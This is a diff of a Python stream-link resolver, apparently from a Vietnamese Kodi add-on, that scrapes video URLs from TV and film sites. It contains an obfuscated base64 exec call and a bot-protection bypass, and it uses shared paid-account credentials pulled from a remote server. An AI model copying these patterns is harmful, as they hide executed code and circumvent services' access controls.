+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+		}
+		req = urllib2.Request(api_url,headers=headers)
+		f = urllib2.urlopen(req)
+		body=f.read()
+		Jstr = json.loads(body)
+		video_url = Jstr['default_episode']['play_info']['data']['hls_link_play']
+		
+	return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=https://www.thvli.vn'
+def getVTCnow(url):
+	r = urlfetch.fetch(url)
+	if '/kenh/' in url:
+		match = re.search(r"src: \"(.+?)\"",r.body)
+	else:
+		match = re.search(r"src: '(.+?)'",r.body)
+	video_url = match.group(1)
+	
+	return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=https://vtcnow.vn/'
+		
+def getHsex(url):
+	r = urlfetch.get(url)
+	regex = r"content=”(.+?)”"
+	match = re.search(regex,r.body)
+	video_url = match.group(1)
+	return video_url
+
+
+def getVTV16(url):
+	r = urlfetch.get(url)
+	regex = r"var urlPlay = \'(.+?)\'"
+	match = re.search(regex,r.body)
+	if match:
+		urlPlay = match.group(1)
+		
+	else:
+		urlPlay = ''
+	regex = r"src=\"(.+?)\"></iframe>"
+	matches = re.search(regex,r.body)
+	geturl = matches.group(1)
+
+	if 'fembed.com' in geturl:
+		match = re.search(r"v\/(.+)",geturl)
+		id_film = match.group(1)
+		api_url = 'http://www.fembed.com/api/sources/'+id_film
+		response = urlfetch.post(api_url)
+		jStr = json.loads(response.body)
+		t = len(jStr['data'])
+		video_url = jStr['data'][(t-1)]['file']
+		return(video_url)
+	else:
+		geturl = urlPlay
+		headers = {
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+			'Cookie': cloudfare(geturl)
+			}
+		r = urlfetch.get(geturl, headers=headers, max_redirects=10)
+		if r.status == 404:
+			notify('Không lấy được link. Lỗi website.')
+			return
+		else:
+			regex = r"\"file\":\"(.+?)\""
+			matches = re.finditer(regex, r.body)
+			video_url = []
+			for matchNum, match in enumerate(matches):
+				matchNum = matchNum + 1
+				for groupNum in range(0, len(match.groups())):
+					groupNum = groupNum + 1
+					match = match.group(groupNum)
+					video_url.append(match)
+			t = len(video_url)
+			return((video_url[(t-1)]))
+        
+
+
+
+def getseetiptv(url):
+	headers = {
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0',
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		'Referer': 'http://sweetiptv.com/live/',
+		'Accept-Encoding': 'gzip, deflate',
+		'Accept-Language': 'en,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
+	}
+	response = urlfetch.get(url,headers=headers)
+	regex = r"stream\":\s\"(.+?)\""
+	match = re.search(regex,response.body)
+	video_url = match.group(1)
+	#Get param
+	regex = r"wmsAuthSign=(.+)"
+	matches = re.search(regex, video_url)
+	wmsAuthSign=matches.group(1)
+	regex = r"(http.+)\?"
+	matches = re.search(regex, video_url)
+	video_url = matches.group(1)
+	video_url = video_url.replace(' ','%20')
+	match = re.search(r"(http.+\/)",video_url)
+	_video_url=match.group(1)
+	headers = {
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+		'Referer': video_url,
+		'Origin': 'http://sweetiptv.com',
+	}
+	params = {'wmsAuthSign': wmsAuthSign}
+	r = urlfetch.get(video_url, headers=headers, params=params)
+	match = re.search(r"(chunk.+)",r.body)
+	string = match.group(1)
+	video_url = _video_url+string
+	return(video_url)
+def getGoogleDrive(url):
+	matches = re.search(r"d\/(.+?)\/", url)
+	if matches:
+		google_id = matches.group(1)
+		url = "https://drive.google.com/uc?export=download&id=%s" % google_id
+		url1 = 'https://drive.google.com/uc?authuser=0&id=%s&export=download' % google_id
+	headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br"}
+	
+	try:
+		r = urlfetch.get(url,headers=headers)
+		cookie = r.cookiestring
+		regex = r"id=\"uc-download-link\".+?href=\"(.+?)\""
+		match = re.search(regex,r.body)
+		url = match.group(1)
+		video_url = "https://drive.google.com"+url
+		video_url = video_url.replace('amp;','')
+		headers  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", "Accept-Encoding" : "gzip, deflate, sdch, br",'cookie':cookie}
+		r = urlfetch.get(video_url,headers=headers)
+		if r.status == 302:
+			link = r.getheader('location')
+			xbmc.log(link)
+			return link
+		else:
+			notify('Quá giới hạn play hôm nay')
+	except:
+		xbmc.log(url)
+		return url1
+	
+def getOpenloadLink(url):
+	regex = r"https://openload.co.+\/(.{11})\/"
+	match = re.search(regex,url)
+	movie_id = match.group(1)
+	api_url = 'https://api.openload.co/1/streaming/get?file=' + movie_id
+	try:
+		r = fetch_data(api_url)
+		jStr = json.loads(r.body)
+		
+	except:
+		notify('Error. Try later')
+	if jStr.get("status",0) == 200:
+		video_url = jStr.get('result',{}).get('url','')
+		return video_url
+	elif jStr.get("status",0) == 403:
+		alert('Hãy vào trang [COLOR yellow]https://olpair.com/[/COLOR] để pairing thiết bị của bạn và thử lại.')
+		
+	
+	
+def getPhimMedia(url):
+	try:
+		r = urlfetch.get(url)
+		match = re.search(r"sources: (\[[^\[]+?\])",r.body)
+		if match:
+			match = match.group(1)
+			t = (match.count('file'))
+			matches = re.findall(r"file: \"(.+?)\"", match)
+			video_url = matches[(t-2)]
+		else:
+			video_url = 'thongbao2'
+	except Exception as e:
+		notify('Link hỏng')
+		pass
+	return video_url
+	
+def getPhimNhanh(url):
+	alert("Không có")
+	return 
 def getTEST(url):
 	video_url = ''
 	return video_url
-def getDriveG(url):
-	
-	media_url = urlresolver.resolve(url)
-	return media_url	
-	
+
+
 def getvtvgo(url):
 	url = url.lower()
-	vtv = {'vtv1':1, 'vtv2': 2, 'vtv3': 3, 'vtv4': 4, 'vtv5': 5, 'vtv6': 6, 'vtv7': 27, 'vtv8':36, 'vtv9':39, 'vtv5nambo': 7}
-	match = re.search(r"\/(.+)", url)
-	channel = match.group(1)
-	contentid = str(vtv[channel])
-	f = 'U2FsdGVkX187QjjKy+qMwPB6Z8YoN5Yz2C8miPmAsL+2OuqTXwZzOxcsDnaxbh/N'
-	if len(USER_VIP_CODE) > 0:
-		try:
-			response = fetch_data(VIETMEDIA_HOST + vmf.gibberishAES(f, 'vmf'))
-			json_data = json.loads(response.body)
-			t =json_data['username'].decode('base64')
-			matches = re.search(r"grab=\"(.+?)\"&app_id=\"(.+?)\"&device_type=\"(.+?)\"&vtv_id=\"(.+?)\"&acc_id=\"(.+?)\"&sign=\"(.+?)\"", t)
-			#TextBoxes('VMF', t)
-			grab = matches.group(1)
-			app_id = matches.group(2)
-			device_type = matches.group(3)
-			vtv_id = matches.group(4)
-			acc_id = matches.group(5)
-			sign = matches.group(6)
-			payload = '{"app_id":"'+app_id+'","device_type":"'+device_type+'","vtv_id":"'+vtv_id+'","acc_id":"'+acc_id+'","sign":"'+sign+'","contenttype":"1","contentid":"'+contentid+'"}'
-			headers = {'cache-control': "no-cache"}
-			response = urlfetch.post(grab.decode("base64"), data=payload, headers=headers)
-			jsonStr = json.loads(response.body)
-			video_url = jsonStr['result']['stream_url'][0]
-			return(video_url)
-		except Exception as e:
-			notify('Khong lay duoc link')
-			pass
+	response = urlfetch.get(url)
+	regex = r"var link = '(.*m3u8)'"
+	match = re.search(regex,response.body)
+	link = match.group(1)
 	
-def getPhimMoi(url):
-	headers = { 'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
-				'Host'				: 'www.phimmoi.net',
-				'Referer'			: url
-				}
-	T2="U2FsdGVkX1+J5yRXU1goqexulsqcAaICSdXjSrml+FFQiYusRAwciVrwAIW86pvrU2RGQmSb9YL/8xMaOnWGbA"		
-	response = urlfetch.get(url, headers=headers)
-	regex = r"(;eval.+)<\/script>"
-	matches = re.search(regex, response.body)
-	payload = matches.group(1)
-	payload = urllib.quote(payload)
-	payload = "data="+payload
-	headers = {
-		'content-type': "application/x-www-form-urlencoded",
-		'cache-control': "no-cache"
-		}
-	response = urlfetch.post(vmf.gibberishAES(T2, 'vmf'), data=payload, headers=headers)
-	response = urlfetch.get(response.body)
-	regex = r"var _responseJson='(.+)';"
-	matches = re.search(regex, response.body)
-	json_data = matches.group(1)
-	json_data = json.loads(json_data)
-	backup_order = json_data['backupOrder']
-	t = len(json_data['medias'])
-	video_url = json_data['medias'][(t-1)]['url']
-	return video_url
-	'''
-	response = urlfetch.get(video_url)
-	if response.status == 302:
-		t = response.getheader('set-cookie')
-		t = urllib.quote(t)
-		link = response.getheader('location')
-		video_url = link+'|'+'Cookie='+t
-		
-	else:
-		t = len(json_data['mediasBk'])
-		video_url = json_data['mediasBk'][(t-1)]['url']
-		response = urlfetch.get(video_url)
-		if response.status == 302:
-			t = response.getheader('set-cookie')
-			link = response.getheader('location')
-			video_url = link+'|'+'Cookie='+t
+	
+
+def getaW1wb3J0IHV(url):
+	exec(fuck('aW1wb3J0IHVud2lzZQp1cmwgPSB1cmwucmVwbGFjZSgnYVcxd2IzSjBJSFYnLCdodHRwOi8vd3d3LnBoaW1tb2kubmV0JykKciA9IHVybGZldGNoLmdldCh1cmwpCl94XyA9IHVud2lzZS51bndpc2VfcHJvY2VzcyhyLmJvZHkpCm1hdGNoID0gcmUuc2VhcmNoKHIic3JjPVwiKC4qZXBpc29kZWluZm8uKz8pXCIiLF94XykKZ2V0X3VybCA9IG1hdGNoLmdyb3VwKDEpCmdldF91cmwgPSBnZXRfdXJsLnJlcGxhY2UoJ2phdmFzY3JpcHQnLCdqc29uJykKcj11cmxmZXRjaC5nZXQoZ2V0X3VybCkKc3RyPWpzb24ubG9hZHMoci5ib2R5KQp2aWRlb191cmwgPSBzdHJbJ21lZGlhcyddWzBdWyd1cmwnXQp2aWRlb191cmwxID0gc3RyWydlbWJlZFVybHMnXVswXQ=='))
+	
+	try:
+		r  = urlfetch.get(video_url)
+		if r.status == 200:
+			notify('Thành công')
+			return video_url
 		else:
-			t = len(json_data['mediasBk1'])
-			if not 'googleusercontent' in video_url:
-				video_url = json_data['mediasBk1'][0]['url']
-	return video_url
-	'''
+			notify('Try to get link')
+			if 'openload' in video_url1:
+				return getOpenloadLink(video_url1)
+			else:
+				return PlayToKodi(url)
+	except:
+		notify('Lỗi website, không lấy được link')
+	
+	
+	
 def getAphim(url):
 	if 'get_file' in url:
 		import urllib
@@ -237,30 +691,30 @@ def getAphim(url):
 		response = urlfetch.get(url, headers=headers)
 		jsonStr = json.loads(response.body)
 		video_url = jsonStr['file']
-		
-		
 	else:
+		response = urlfetch.get(url)
+		match = re.search(r"value=\"(.+?)\" id=\"_movie_id\">", response.body)
+		movie_id = match.group(1)
+		match = re.search(r"data-movie-id=\"(.+?)\"", response.body)
+		episode_id = match.group(1)
 		headers = { 'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
-				'Host'				: 'aphim.co',
-				'X-Requested-With'	:  'XMLHttpRequest',
-				'Referer'			: url
-				}
-				
-		response = urlfetch.get(url, headers=headers)
-		regex = r"phim\/(.+)"
-		matches = re.search(regex, url)
-		slug = matches.group(1)
-		getid_url = 'https://aphim.co/api/movie/'+slug
-		response = urlfetch.get(getid_url, headers=headers)
-		jsonStr = json.loads(response.body)
-		movie_id = jsonStr['id']
-		episodes_id = jsonStr['episodes'][0]['contents'][0]['id']
-		get_url = 'https://aphim.co/player/get_file?type=watch&movie_id='+movie_id+'&episode_id='+episodes_id+'&server=&_x=0.36660287152800464'
-		response = urlfetch.get(get_url, headers=headers)
-		jsonStr = json.loads(response.body)
-		video_url = jsonStr['file']
+					'Host'				: 'aphim.co',
+					'X-Requested-With'	:  'XMLHttpRequest',
+					'Referer'			: url
+					}
+		try:
+			request_url = 'https://aphim.co/load-film-header'
+			data = {'movie_id': movie_id, 'episode_id': episode_id}
+			response = urlfetch.post(request_url, headers=headers, data=data)
+			jsonStr =json.loads(response.body)
+			video_url = jsonStr['list_source_single'][0][0]['file']
+		except Exception as e:
+			notify('Link bị hỏng hoặc code web thay đổi')
+			pass
 	
 	return video_url
+
+'''	
 def GoogleDrive(url):
 	response = urlfetch.get(url)
 	if response.status == 302:
@@ -270,11 +724,22 @@ def GoogleDrive(url):
 	else:
 		video_url = 'thongbao4-Video het luot xem. Xin vui long quay lai sau.'
 	return video_url
-
-def getOpenload(url):
-	alert('Đang xử lý. Vui lòng quay lại sau.')
-	#media_url = urlresolver.resolve(url)
-	return 	
+'''
+def PlayToKodi(url):
+	
+	if 'ok.ru' in url:
+		return getOkru(url)
+	else:
+		try:
+			video_url = 'plugin://plugin.video.sendtokodi/?'+url
+			return video_url
+		except:
+			notify('Không lấy được link')
+			pass
+	
+	
+		
+	
 	
 def getHdsieunhanh(url):
 	
@@ -305,16 +770,13 @@ def getHdsieunhanh(url):
 
 	try:
 		response = urlfetch.get('http://www.hdsieunhanh.com/getsource'+show+'/' +pid +'_'+tapid +'?ip=' +yourip, headers=headers, data=data)
-
-		print (response.body)
 		json_data = json.loads(response.body)
 		video_url = json_data['sources'][0]['file']
-		#Phu de
 		phude = json_data['tracks'][2]['file']
 		return (video_url+'[]'+phude)
 	except Exception as e:
-			print e
-			pass
+		print e
+		pass
 			
 
 def getMp3Zing(url):
@@ -471,45 +933,6 @@ def xemphimso(url):
 	return video_url
 	
 
-def getxemphimbox(url):
-	matches = re.search(r"-(\d+)", url)
-	idfilm = matches.group(1)
-	response = urlfetch.get(url)
-	cookie = response.cookiestring;
-	matches = re.search(r"filmInfo\.episodeID = parseInt\('(\d+)'\);", response.body)
-	idEP = matches.group(1)
-	host = 'xemphimbox.com'
-	headers = {
-			'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
-			'Referer': url,
-			'Host'	: host,
-			'X-Requested-With'	: 'XMLHttpRequest',
-			'Cookie'			: cookie}
-	data = {
-			'NextEpisode':  1,
-			'EpisodeID'	: idEP,
-			'filmID'	: idfilm,
-			'playTech'	: 'auto'}
-
-	response = urlfetch.post('http://xemphimbox.com/ajax', headers=headers, data=data)
-	matches = re.search(r"src=\"(.+?)\"", response.body)
-	getlink = matches.group(1)
-	millis = int(round(time.time() * 1000))
-	getlink += '&_=' + str(millis)
-	host = 'grab.xemphimbox.com'
-	headers = {
-			'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
-			'Referer': url,
-			'Host'	: host,
-			'X-Requested-With'	: 'XMLHttpRequest',
-			'Cookie'			: cookie}
-	response = urlfetch.get(getlink, headers=headers)
-	matches = re.search(r"jwConfigPlayer.playlist\[0\].sources =(.*?);", response.body)
-	jsonStr = json.loads(matches.group(1))
-	video_url = jsonStr[len(jsonStr)-1]['file']	
-	return video_url
-	
-		
 
 def getHaivn(url):
 	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
@@ -662,8 +1085,6 @@ def getVtv(url)	:
 	
 def getTvnet(url):
 	headers = {'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Origin': 'http://vn.tvnet.gov.vn', 'Referer': url}
-	matches = re.search(r"/\d+\/(.+)", url)
-	channel = matches.group(1)
 	r = urlfetch.get(url, headers=headers)
 	matches = re.search(r"data-file=\"(.+?)\"", r.body)
 	url_get = matches.group(1)
@@ -699,156 +1120,78 @@ def getSopcast(url):
 	return sopcast_link
 		
 def get_fptplay(url):
-	fptplay_option = ADDON.getSetting('fptplay_option')
-	
-	#Xem tv có thể không cần account hoặc có account hoặc có code VMF
-	
-	if 'livetv' in url:
-		if fptplay_option == 'true':
-			
-			user = ADDON.getSetting('fptplay_user')
-			password = ADDON.getSetting('fptplay_pass')
-			country_code = ADDON.getSetting('country_code')
-			matches = re.search(r"(.+)\s", country_code)
-			country_code = matches.group(1)
-			params = {'country_code': country_code, 'phone': user, 'password': password, 'submit': ''}
-			headers = {'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Referer':'https://fptplay.net/'}
-			url_login = 'https://fptplay.net/user/login'
-			url_logout = 'https://fptplay.net/user/logout'
-			if len(user) == 0  or len(password) == 0:
-				sleep(2)
-				notify(u'Bạn nên nhập user và pasword của FPTplay.net. Đăng ký trên trang web http://fptplay.net'.encode("utf-8"))
-				#ADDON.openSettings()
-			
-			s = requests.Session()
-			r = s.get('https://fptplay.net')
-			r = s.post(url_login, headers=headers, data=params)
-			headers = { 
-						'Referer'			: url,
-						'X-KEY'				: '123456',
-						'X-Requested-With'	: 'XMLHttpRequest'
-					}
-			
-			#Kiểm tra live tivi 
-			match = re.search(r'\/livetv\/(.*)$', url)
-			if match:
-				channel_id = match.group(1)
-				data = {
-					'id' 	   : channel_id,
-					'type'     : 'newchannel',
-					'quality'  : 3,
-					'mobile'   : 'web'
-				}
-				r = s.post('https://fptplay.net/show/getlinklivetv', headers=headers, data=data)
-				
-				response = fetch_data(url_logout, headers)
-				if response.status == 302:
-					notify (u'Done'.encode("utf-8"))
-				video_url=json.loads(r.content)['stream']+'User-Agent=Mozilla/5.0 (compatible; MSIE 10.0; Trident/6.0; IEMobile/10.0; ARM; Touch; WINDOWS;MSI;MSI MSI-MS-7996;)'
-				
-				return video_url
-
-				
-			#match = re.search(r'\-([\w]+)\.html', url)
-			#if not match:
-			#	return
-
-		if fptplay_option == 'false':
-			if len(USER_VIP_CODE) == 0:
-				alert(u'Bạn chưa nhập [COLOR red]VMF[/COLOR] code hoặc tài khoản cá nhân FPTPLAY'.encode("utf-8"), 'Soạn tin: [COLOR red]VMF[/COLOR] gửi [COLOR red]8798[/COLOR] để lấy VMF Code')
-				return
-			if len(USER_VIP_CODE) > 0:
-				try:
-					url_account = VIETMEDIA_HOST + '?action=fptplay_account'
-					response = fetch_data(url_account)
-					json_data = json.loads(response.body)
-					user = json_data['username']
-					xbmc.log(user)
-					password = json_data['password']
-					xbmc.log(password)
-					country_code = 'VN'
-					#Code getlink
-					params = {'country_code': country_code, 'phone': user, 'password': password, 'submit': ''}
-					headers = {'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Referer':'https://fptplay.net/'}
-					url_login = 'https://fptplay.net/user/login'
-					url_logout = 'https://fptplay.net/user/logout'
-					s = requests.Session()
-					r = s.get('https://fptplay.net')
-					r = s.post(url_login, headers=headers, data=params)
-					headers = { 
-								'Referer'			: url,
-								'X-KEY'				: '123456',
-								'X-Requested-With'	: 'XMLHttpRequest'
-							}
-					
-					#Kiểm tra live tivi 
-					match = re.search(r'\/livetv\/(.*)$', url)
-					if match:
-						channel_id = match.group(1)
-						data = {
-							'id' 	   : channel_id,
-							'type'     : 'newchannel',
-							'quality'  : 3,
-							'mobile'   : 'web'
-						}
-						r = s.post('https://fptplay.net/show/getlinklivetv', headers=headers, data=data)
-						
-						video_url=json.loads(r.content)['stream']+'User-Agent=Mozilla/5.0 (compatible; MSIE 10.0; Trident/6.0; IEMobile/10.0; ARM; Touch; WINDOWS;MSI;MSI MSI-MS-7996;)'
-						
-						return video_url
-						
-				except Exception as e:
-					pass
-				
-	#Xem phim k cần account vip
+	import requests
+	match = re.search(r'\-([\w]+)\.html', url)
+	movie_id = match.group(1)
+	match = re.search(r'#tap-([\d]+)$', url)
+	if match:
+		episode_id = match.group(1)
 	else:
-		user = ADDON.getSetting('fptplay_user')
-		password = ADDON.getSetting('fptplay_pass')
-		country_code = ADDON.getSetting('country_code')
-		matches = re.search(r"(.+)\s", country_code)
-		country_code = matches.group(1)
-		url_login = 'https://fptplay.net/user/login'
-		params = {'country_code': country_code, 'phone': user, 'password': password, 'submit': ''}
-		headers = {'User_Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Referer':'https://fptplay.net/'}
-		s = requests.Session()
-		r = s.get('https://fptplay.net')
-		r = s.post(url_login, headers=headers, data=params)
-		headers = { 
-					'Referer'			: 'https://fptplay.net',
-					'X-Requested-With'	: 'XMLHttpRequest'
-				}
-		
-		match = re.search(r'\-([\w]+)\.html', url)
-		if not match:
-			return
-		movie_id = match.group(1)
-		match = re.search(r'#tap-([\d]+)$', url)
-		
-		if match:
-			episode_id = match.group(1)
-		else:
-			episode_id = 1
+		episode_id = 1
 
-		data = {
-			'id' 	   : movie_id,
-			'type'     : 'newchannel',
-			'quality'  : 3,
-			'episode'  : episode_id,
-			'mobile'   : 'web',
-		}
-		r = s.post('https://fptplay.net/show/getlink', headers=headers, data=data)
-		json_data = json.loads(r.content)
-		video_url=json.loads(r.content)['stream']+'User-Agent=Mozilla/5.0 (compatible; MSIE 10.0; Trident/6.0; IEMobile/10.0; ARM; Touch; WINDOWS;MSI;MSI MSI-MS-7996;)'
-		return video_url
+	s = requests.Session()
+	r = s.get('https://fptplay.net')
+	headers = {
+		'origin': 'https://fptplay.vn',
+		'x-key': '123456',
+		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+		'accept': 'application/json, text/javascript, */*; q=0.01',
+		'referer': url,
+		'authority': 'fptplay.vn',
+		'x-requested-with': 'XMLHttpRequest',
+		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
+	}
+
+	data = {
+	  'id': movie_id,
+	  'type': 'newchannel',
+	  'quality': '3',
+	  'episode': episode_id,
+	  'mobile': 'web'
+	}
+
+	r = s.post('https://fptplay.vn/show/getlink', headers=headers, data=data)
+	json_data = json.loads(r.content)
+	video_url=json.loads(r.content)['stream']
+	return video_url+'|User-Agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36&Referer=https://fptplay.vn' 
 
 def get_vtvgo(url):
-	response = urlfetch.get(url)
-	matches = re.search(r"addPlayer\('(.+?)'", response.body)
-	if not matches:
-		return 'thongbao2'
-	else:	
-		video_url = matches.group(1)
-		return(video_url+'|Referer=http%3a%2f%2fvtvgo.vn&User-Agent=Mozilla%2f5.0+(Windows+NT+10.0%3b+WOW64%3b+rv%3a48.0)+Gecko%2f20100101+Firefox%2f48.0')
+	import requests
+	if not 'https' in url:
+		url = url.replace('http','https')
+	headers = {
+		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" ,
+		"Accept-Encoding" : "gzip, deflate" ,
+		"Referer" : url ,
+		"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8" ,
+		"Origin" : "https://vtvgo.vn" ,
+		"X-Requested-With" : "XMLHttpRequest"
+	}
+	r = requests . Session ( )
+	r . headers . update ( headers )
+	content = r . get ( url )
+	content = content . text . encode ( "utf8" )
+	regex = r"var token = '(.+?)'"
+	match = re.search(regex,content)
+	token = match.group(1)
+	print(token)
+	match = re.search(r"var time = '(.+?)'",content)
+	time = match.group(1)
+	print(time)
+	match = re.search(r"-(\d+)\.html",url)
+	id_channel = match.group(1)
+	data = {
+		"type_id" : "1" ,
+			"id" : id_channel,
+			"time" : time,
+			"token" : token
+	}
+	r = r.post("https://vtvgo.vn/ajax-get-stream",data = data,verify = False)
+	match = re.search(r"(https.+?m3u8)",r.content)
+	video_url = match.group(1)
+	video_url = video_url.replace("\/","/")
+	
+	return (video_url+"|'User-Agent=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F56.0.2924.87%20Safari%2F537.36& Referer=http%3A%2F%2Fvtvgo.vn%2F")
 
 def get_htvonline(url):
 	response = fetch_data(url)
@@ -861,39 +1204,6 @@ def get_htvonline(url):
 	video_url = match.group(1)
 	video_url = video_url.replace('playlist', 'chunklist')
 	return(video_url+'|Referer=http%3A%2F%2Fhplus.com.vn&User-Agent=Mozilla%2f5.0+(Windows+NT+10.0%3b+WOW64%3b+rv%3a48.0)+Gecko%2f20100101+Firefox%2f48.0')
-
-def get_servertv24(url):
-	user = ADDON.getSetting('sctv_user')
-	password = ADDON.getSetting('sctv_pass')
-	channelid = re.search(re.compile(r"\/(\d+)\/"), url).group(1)
-	response = urlfetch.get(url)
-	if not response:
-		notify('Kiểm tra nguồn phát tại [COLOR red]tv24h.vn[/COLOR] và báo cho người phát triển.')
-		return
-	cookie=response.cookiestring;
-	matches = re.search(r'\"channel_token\" value=\"(.+?)\"', response.body)
-	channeltoken = matches.group(1)
-	signin_url = 'http://tv24.vn/client/login/process'
-	headers = {'Host': 'tv24.vn', 'Accept-Encoding': 'gzip, deflate, compress, identity, *', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Cookie': cookie, 'Referer': 'http://web.tv24.vn/dang-nhap'}
-	data = {'mobile': user, 'password': password}
-	urlfetch.post(signin_url, headers=headers, data=data)
-	data = {'channel_id': channelid, 'channel_token': channeltoken}
-	response = urlfetch.post('http://tv24.vn/client/channel/link', headers=headers, data=data)
-	if 'null' in response.body:
-		if len(user) == 0  or len(password) == 0:
-			sleep(1)
-			alert(u'Bạn hãy đăng ký tài khoản trên web [COLOR red]http://tv24.vn[/COLOR] và nhập trong Setting của Addon VMF'.encode("utf-8"))
-		else:
-			notify('Link bị lỗi')
-	else:
-		json_data = json.loads(response.body)
-		video_url = json_data['data']['PLAY_URL']
-		notify("Đang getlink")
-		video_url = vmf.sctv(channeltoken, video_url)
-		sleep(5)
-		if len(video_url) == 0:
-			alert(u'Lỗi không lấy được link. Xin vui lòng thử lại.'.encode("utf-8"))
-		return (video_url)
 	
 	
 def get_thvl(url):
@@ -908,43 +1218,31 @@ def get_tvmienphi(url):
 	headers = {'Host': 'link.tvmienphi.biz', 'Accept-Encoding': 'gzip, deflate, compress, identity, *', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Cookie': cookie, 'Referer': 'http://mi.tvmienphi.biz/'}
 	return re.search(r'channel_stream\s=\s\"(.*?)\"', urlfetch.get(url, headers=headers).body).group(1)
 
-def get_serverthunghiem(url):
-	return re.search(r'data-file="(.*?)"', urlfetch.get(re.search(r'=(.*)', url).group(1)).body).group(1)
-	
-def get_xuongphim(url):
-	response = urlfetch.get(url)
-	#cookie=response.cookiestring;
-	match = re.search(re.compile(ur'file:\s"(.*?)"'), response.body)
-	video_url = match.group(1)
-	match = re.search(re.compile(r'file:\s\"(\/sub.*?)\"'), response.body)
-	if match:
-		phude = '|http://xuongphim.tv/'+match.group(1)
-	else:
-		phude = ''
-	return video_url+phude	
 
 def get_htvplus(url):
 	if len(USER_VIP_CODE) > 0:
 		try:
 			f='U2FsdGVkX1+RQXkDAFegicGii3RLBVGrsbMVRV+kHpUpTExURcDQLDLLDkxsGOTf'
-			notify(u'VMF Getlink system'.encode("utf-8"))
+			#notify(u'VMF Getlink system'.encode("utf-8"))
 			response = fetch_data(VIETMEDIA_HOST + vmf.gibberishAES(f, 'vmf'))
 			json_data = json.loads(response.body)
 			t =json_data['username'].decode("base64")
 			headers = { 
-					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
 					'Referer'			: url,
 					'Cookie'		: t
 					}
 			response = urlfetch.get(url, headers=headers)
-			
 			regex = r"iosUrl = \"(.+?)\""	
 			matches = re.search(regex, response.body)
 			video_url = matches.group(1)
+			
 			get_url = 'http://hplus.com.vn/content/getlinkvideo/'
 			headers = { 
 					'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
 					'Referer'			: url,
+					'Host'		: 'hplus.com.vn',
+					'X-Requested-With': 'XMLHttpRequest',
 					'Cookie'		: t			
 					}
 			data = {'url': video_url, 'type': '1', 'is_mobile': '0'}
@@ -952,6 +1250,7 @@ def get_htvplus(url):
 			video_url = response.body.encode("utf-8")
